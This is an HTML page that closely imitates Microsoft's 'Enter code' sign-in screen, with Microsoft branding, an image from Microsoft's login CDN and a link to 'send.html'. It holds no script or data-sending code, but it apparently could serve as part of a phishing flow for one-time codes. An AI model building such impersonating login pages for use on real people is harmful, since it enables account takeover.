<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft Sign In - Enter Code</title>
    <style>
        body {
            font-family: 'Segoe UI', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            position: relative;
            overflow: hidden;
        }
        
        .background-shapes {
            position: absolute;
            width: 100%;
            height: 100%;
            z-index: -1;
        }
        
        .shape {
            position: absolute;
        }
        
        .shape-orange {
            width: 300px;
            height: 300px;
            border-radius: 50% 0 0 50%;
            background: linear-gradient(135deg, #ff8c00, #ff6a00);
            top: 20%;
            left: 10%;
            transform: rotate(-45deg);
            opacity: 0.7;
        }
        
        .shape-blue {
            width: 200px;
            height: 300px;
            background: linear-gradient(135deg, #00bfff, #1e90ff);
            top: 40%;
            left: 30%;
            transform: skew(20deg);
            opacity: 0.7;
        }
        
        .shape-purple {
            width: 400px;
            height: 400px;
            border-radius: 50%;
            border: 30px solid #9370db;
            top: 10%;
            right: 10%;
            opacity: 0.7;
        }
        
        .shape-green {
            width: 300px;
            height: 300px;
            border-radius: 50%;
            border: 20px solid #32cd32;
            bottom: 10%;
            right: 15%;
            opacity: 0.7;
        }
        
        .signin-container {
            background-color: white;
            width: 380px;
            padding: 40px;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
        }

        .microsoft-logo {
            margin-bottom: 16px;
        }

        .microsoft-logo img {
            height: 24px;
        }
        
        .back-link {
            display: flex;
            align-items: center;
            color: #666;
            text-decoration: none;
            font-size: 14px;
            margin: 15px 0;
        }
        
        .back-arrow {
            margin-right: 5px;
        }
        
        h1 {
            font-size: 24px;
            font-weight: 600;
            margin: 20px 0;
        }
        
        p {
            margin-bottom: 20px;
            color: #333;
            font-size: 14px;
        }
        
        .code-input {
            width: 100%;
            padding: 6px 0;
            margin-bottom: 15px;
            border: none;
            border-bottom: 1px solid #999;
            outline: none;
            font-size: 16px;
        }
        
        .link {
            color: #0067b8;
            text-decoration: none;
            font-size: 14px;
            display: block;
            margin: 10px 0 20px;
        }
        
        .sign-in-button {
            background-color: #0067b8;
            color: white;
            border: none;
            padding: 8px 24px;
            font-size: 14px;
            cursor: pointer;
            float: right;
        }
        
        .footer {
            position: absolute;
            bottom: 0;
            width: 100%;
            display: flex;
            justify-content: space-between;
            padding: 10px 20px;
            background-color: rgba(255, 255, 255, 0.8);
            font-size: 12px;
        }
        
        .footer-links {
            display: flex;
        }
        
        .footer-link {
            margin-right: 15px;
            color: #666;
            text-decoration: none;
        }
        
        .more-options {
            color: #666;
        }
    </style>
</head>
<body>
    <div class="background-shapes">
        <div class="shape shape-orange"></div>
        <div class="shape shape-blue"></div>
        <div class="shape shape-purple"></div>
        <div class="shape shape-green"></div>
    </div>
    
    <div class="signin-container">
        <div class="microsoft-logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Microsoft">
        </div>
        
        <a href="send.html" class="back-link">
            <img data-testid="accessibleImg" src="https://logincdn.msftauth.net/shared/5/js/../images/arrow_left_a9cc2824ef3517b6c416.svg" alt="" role="presentation"> user@gmail.com
        </a>
        
        <h1>Enter code</h1>
        
        <p>We emailed a code to user@gmail.com. Please enter the code to sign in.</p>
        
        <input type="text" class="code-input" placeholder="Enter code">
        
        <a href="#" class="link">Other ways to sign in</a>
        
        <button class="sign-in-button">Sign in</button>
    </div>
    
    <div class="footer">
        <div class="footer-links">
            <a href="#" class="footer-link">Terms of use</a>
            <a href="#" class="footer-link">Privacy & cookies</a>
            <span class="more-options">...</span>
        </div>
        <div class="private-browsing">
            Use private browsing if this is not your device. <a href="#" class="footer-link">Learn more</a>
        </div>
    </div>
</body>
</html>
